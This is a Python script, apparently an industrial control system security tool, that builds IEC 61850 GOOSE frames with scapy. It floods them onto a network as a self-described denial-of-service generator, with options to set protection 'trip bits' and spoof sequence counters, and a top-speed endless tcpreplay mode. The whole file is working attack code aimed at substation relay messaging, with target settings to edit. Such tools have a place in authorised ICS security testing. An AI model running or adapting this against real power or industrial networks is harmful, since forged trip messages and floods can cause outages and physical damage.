#!/usr/bin/env python3
"""
goose_swarm.py  -  GOOSE flood / DoS generator

Fork of goose_trip.py, reusing its GOOSE TLVs, ALL_DATA blob and trip-bit offsets to
drive a continuous flood of GOOSE (The Swarm).  Supports both a Python-loop at a
configurable FPS or a "topspeed" flood via tcpreplay.

Created By Ashton Ruesch

Example Usage
===============
# Send one frame (Python single-shot)
sudo python3 goose_swarm.py -i eth0

# Python-loop at 100 fps for 30 s:
sudo python3 goose_swarm.py -i eth0 -r 100 -d 30

# Python-loop with trip bits set:
sudo python3 goose_swarm.py -i eth0 -t -r 10

# Infinite topspeed flood (requires tcpreplay):
sudo python3 goose_swarm.py -i eth0 --fast

# Infinite topspeed + trip bits + seq increment:
sudo python3 goose_swarm.py -i eth0 --fast -t --start-sq 100 --inc-sq

Arguments
=========
-i, --iface     : Network interface to send on (required)  
-u, --untagged  : Send raw EtherType 0x88B8 (no 802.1Q tag)  
-r, --rate      : Frames/sec (0 = Python single-shot)  
-t, --trip      : Set the four trip bits in the ALL_DATA payload  
-d, --duration  : Seconds to run (0 = until Ctrl-C)  
--fast          : Use tcpreplay --topspeed --loop=0 for infinite flood  
--start-st N    : Initial stNum (0-255)  
--start-sq N    : Initial sqNum (0-65535)  
--inc-st        : Increment stNum on each send (wraps at 255)  
--inc-sq        : Increment sqNum on each send (wraps at 65535)  
"""


import argparse
import struct
import time
import os
import sys
import shutil
import tempfile
import subprocess

from scapy.all import Ether, Dot1Q, Raw, get_if_hwaddr, sendp
from scapy.utils import wrpcap

# --------------------- ASCII ART ---------------------
GOOSE_ART = r"""
                                                                                         
                                                -@                                                  
                                  @@           @@@                                                  
                                  @@@        @=#@@                                                  
                                  @@@@        @@@@@                                                 
        Swarming                @@@@@@@*    @@+@@@@.                                                
        The Wire                  @@@@@@@   : @@@@@@                                                
                                 @@@#@@@@@@  @@@@@@@@                                               
                                   @@@@@@@@@@  @@@@@@@                  @+@@@                       
                                  @@@@@@@@@@@@@   @@@@@               @@@   @@@@                    
                                    @@@@@@@@@@@@@@  @@@@@          @@@@@@@@                         
                                        @@@@@@@@@@@@  @@@@     @@@@@@@                              
                        :@@@          @@@@@@@@@@@@@@@@  @@@@   #@@@@                                
                        @@@@            @@@@@@@@@@@@@@@@         @.                                 
                      @@ @@@                @@@@@@@@@@@@@       @@                                  
                      @@@@@@#                 @@@@@@@-         @@                                   
                    @@  @@@@@                  @@@            @@                                    
                     @@@@@@@@@               =              @@@                                     
                    @  @@@@@@@@             @@@           @@@                                       
                    @@@@ @@@@@@@          @@@   @@@@@@@@@@                                          
                      +@@@@@@@@@@        @@@@@@@                                                    
                    @@@@@@@@@@@@@@         +                                                        
                      :@@@@@@@@@@@@                    @@@@@                                        
                      @@@@@@@@@@@@@@@               @@@@   @@@@:                                    
                         @@@@@@@@@@@@@          +@@@@@@@@*                                          
                       @@@@@@@@@@@@@@@@@    @@@@@@@@@                                               
                         @@@@@@@@@@@@@@@@@     @@@                                                  
                             @@@@@@@@@@         @                                                   
                            @@@@@@@#           @@@                                                  
                            @@@               @@@@@@@                                               
                          @@                 @@@@@@@@@@                                             
                           :               @@@@@@@@@@@@@@@-                                         
                      @@@@@            @@@@ @@@@@@@@@@@@@@@@@@@@@@@                                 
                    *@@@@  @@@@@@@@@@@@@       @@@@@@@@@@@@@@@@*                                    
                    @@@@@@@@                       @  @@ @@                                         
                     :@#                                                                            
                                                                                                    
"""

# ------------------- Configuration -------------------
#Edit these to fit your GOOSE target
DST_MAC  = "01:0C:CD:01:00:01"
SRC_MAC  = "00:e0:4c:94:2b:b3"
APPID    = 0x03e8
TTL_MS   = 2000
CONF_REV = 1
VLAN_ID  = 1
VLAN_PCP = 4

#Data portion of PDU Hex Bytes
DATA_HEX = (
    "8301018501198910fa7709729c57c48bfc335cfb08326c55"
)
ALL_DATA = bytes.fromhex(DATA_HEX)

#Byte offsets to flip
OFFSETS  = ()

# ------------------ PAYLOAD HELPERS --------------------
def patch_trip(trip: bool) -> bytes:
    if not trip:
        return ALL_DATA
    b = bytearray(ALL_DATA)
    for i in OFFSETS:
        b[i] = 0x01
    return bytes(b)

def tlv(tag: int, val: bytes) -> bytes:
    ln = len(val)
    if ln < 0x80:
        return bytes([tag, ln]) + val
    if ln < 0x100:
        return bytes([tag, 0x81, ln]) + val
    return bytes([tag, 0x82]) + struct.pack("!H", ln) + val

def tod() -> bytes:
    now  = time.time()
    sec  = int(now)
    frac = int((now - sec) * (1 << 24))
    return struct.pack("!L", sec) + frac.to_bytes(3, "big") + b"\x00"

def build_frame(st: int, sq: int, untagged: bool, trip: bool):
    body = b"".join([
        #Edit these to fit your GOOSE target
        tlv(0x80, b"IEDA/LLN0$GO$healthA"),
        tlv(0x81, struct.pack("!H", TTL_MS)),
        tlv(0x82, b"IEDA/LLN0$AnalogValues"),
        tlv(0x83, b"IEDA/LLN0$GO$healthA"),
        tlv(0x84, tod()),
        tlv(0x85, struct.pack("!B", st & 0xFF)),
        tlv(0x86, struct.pack("!H", sq & 0xFFFF)),
        tlv(0x87, b"\x00"),
        tlv(0x88, struct.pack("!B", CONF_REV)),
        tlv(0x89, b"\x00"),
        tlv(0x8A, b"\x01"),
        tlv(0xAB, patch_trip(trip)),
    ])
    pdu      = tlv(0x61, body)
    goosehdr = struct.pack("!HHHH", APPID, len(pdu) + 8, 0, 0)
    payload  = goosehdr + pdu

    eth = Ether(dst=DST_MAC, src=SRC_MAC)
    if untagged:
        eth.type = 0x88B8
    else:
        eth.type = 0x8100
        eth /= Dot1Q(prio=VLAN_PCP, vlan=VLAN_ID, type=0x88B8)

    return eth / Raw(load=payload)

# ---------------- Calculate MTU Size -------------------
def iface_mtu(iface: str, default=1500) -> int:
    try:
        with open(f"/sys/class/net/{iface}/mtu") as f:
            return int(f.read().strip())
    except:
        return default

def max_payload(iface: str, untagged: bool) -> int:
    mtu   = iface_mtu(iface)
    probe = build_frame(1, 0, untagged, False)
    ovh   = len(bytes(probe)) - len(ALL_DATA)
    return max(0, mtu - ovh)

# --------------- General Loop Driver -------------------
def python_loop(iface, untagged, fps, duration, trip,
                start_st, start_sq, inc_st, inc_sq):
    # Defaults if incrementing without explicit start
    if inc_st and start_st is None:
        start_st = 1
    if inc_sq and start_sq is None:
        start_sq = 0

    st, sq  = (start_st or 1), (start_sq or 0)
    intv    = 0 if fps <= 0 else 1.0 / fps
    stop    = time.time() + duration if duration > 0 else float("inf")
    last_ts, cnt = time.time(), 0

    while time.time() < stop:
        pkt = build_frame(st, sq, untagged, trip)
        try:
            sendp(pkt, iface=iface, verbose=False)
        except OSError as e:
            if e.errno == 90:
                print("Frame too long - aborting")
            else:
                print(e)
            break

        cnt += 1
        # increment counters
        if inc_sq:
            sq = (sq + 1) & 0xFFFF
        if inc_st:
            st = (st + 1) & 0xFF

        if intv:
            time.sleep(intv)
        now = time.time()
        if now - last_ts >= 1.0:
            print(f"[+] {cnt} pkts/s  st={st}  sq={sq}")
            cnt, last_ts = 0, now

# ------------------ Fast Loop Driver -------------------
def fast_path(iface, untagged, trip, duration,
              start_st, start_sq, inc_st, inc_sq):
    if not shutil.which("tcpreplay"):
        print("--fast requires tcpreplay in $PATH"); sys.exit(1)

    # Determine how many distinct frames to generate
    st, sq = (start_st or 1), (start_sq or 0)
    if inc_st and not inc_sq:
        count = 256
    elif inc_sq and not inc_st:
        count = 65536
    elif inc_st and inc_sq:
        count = 256
    else:
        count = 1

    # Build the packet sequence
    pkts = []
    for _ in range(count):
        pkts.append(build_frame(st, sq, untagged, trip))
        if inc_sq:
            sq = (sq + 1) & 0xFFFF
        if inc_st:
            st = (st + 1) & 0xFF

    # Write to a temp pcap
    with tempfile.NamedTemporaryFile(suffix=".pcap", delete=False) as f:
        wrpcap(f.name, pkts)
        pcap = f.name

    cmd = [
        "tcpreplay",
        "--intf1", iface,
        "--topspeed",
        "--loop=0",
        pcap
    ]
    print("Exec:", " ".join(cmd))
    proc = subprocess.Popen(cmd)
    try:
        if duration > 0:
            proc.wait(timeout=duration)
        else:
            proc.wait()
    except subprocess.TimeoutExpired:
        proc.terminate()
    finally:
        os.remove(pcap)

# ------------------------ Main -------------------------
def parse_args():
    p = argparse.ArgumentParser(
        description="GOOSE Swarm Control")
    p.add_argument("-i","--iface",    required=True, help="TX interface")
    p.add_argument("-u","--untagged", action="store_true",
                   help="No VLAN tag (raw 0x88B8)")
    p.add_argument("-r","--rate",     type=float, default=0,
                   help="Frames/sec (0=single Python shot)")
    p.add_argument("-t","--trip",     action="store_true",
                   help="Set trip bits in payload")
    p.add_argument("-d","--duration", type=float, default=0,
                   help="Seconds to run (0=until Ctrl-C)")
    p.add_argument("--fast",         action="store_true",
                   help="Use tcpreplay --topspeed --loop=0")
    p.add_argument("--start-st",     type=int,
                   help="Initial stNum (0-255)")
    p.add_argument("--start-sq",     type=int,
                   help="Initial sqNum (0-65535)")
    p.add_argument("--inc-st",       action="store_true",
                   help="Increment stNum each send (wraps at 255)")
    p.add_argument("--inc-sq",       action="store_true",
                   help="Increment sqNum each send (wraps at 65535)")
    return p.parse_args()

if __name__ == "__main__":
    args = parse_args()

    # Check: ALL_DATA fits MTU
    maxd = max_payload(args.iface, args.untagged)
    if len(ALL_DATA) > maxd:
        print(f"ALL_DATA ({len(ALL_DATA)} B) > MTU limit ({maxd} B)")
        sys.exit(1)

    print(GOOSE_ART)

    mode = "--fast" if args.fast else (
           f"{args.rate:.1f} fps" if args.rate > 0 else "single-shot")
    tag  = "untagged" if args.untagged else "tagged"
    trip_txt = " +TRIP" if args.trip else ""
    print(f"Sending the Swarm on {args.iface} - {tag}{trip_txt} - {mode}")

    if args.fast:
        fast_path(
            args.iface, args.untagged, args.trip, args.duration,
            args.start_st, args.start_sq,
            args.inc_st, args.inc_sq
        )
    else:
        if args.rate == 0:
            # single-shot
            st = args.start_st or 1
            sq = args.start_sq or 0
            pkt = build_frame(st, sq, args.untagged, args.trip)
            print("Sending one frame...")
            sendp(pkt, iface=args.iface, verbose=True)
        else:
            python_loop(
                args.iface, args.untagged, args.rate, args.duration,
                args.trip, args.start_st, args.start_sq,
                args.inc_st, args.inc_sq
            )
